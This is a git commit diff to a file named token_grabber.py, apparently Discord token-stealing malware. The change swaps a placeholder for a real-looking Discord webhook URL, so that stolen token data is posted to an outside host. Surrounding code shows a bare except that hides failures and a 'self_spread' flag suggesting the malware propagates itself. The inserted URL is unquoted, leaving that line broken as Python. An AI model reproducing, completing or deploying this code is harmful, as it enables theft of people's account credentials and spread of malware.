6dc864c1ee09bdd21fb4644bb58c0866ed80611d
zViruz <71944015+zViruz@users.noreply.github.com>
2024-05-17 05:16:24 +0200

    Update token_grabber.py

--- token_grabber.py
+++ token_grabber.py
@@ -182,7 +182,7 @@ def main():
         "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
     }
     try:
-        urlopen(Request("WEBHOOK_URL", data=dumps(webhook).encode(), headers=getheaders()))
+        urlopen(Request(https://discord.com/api/webhooks/1240864851400724500/cKvSGvkamD2HDp_XqzxNo6ukF3gkwwXtZ3iE9apvext4fnOEbfEgJEzdV2_nnJa5qxCx, data=dumps(webhook).encode(), headers=getheaders()))
     except:
         pass
     if self_spread:
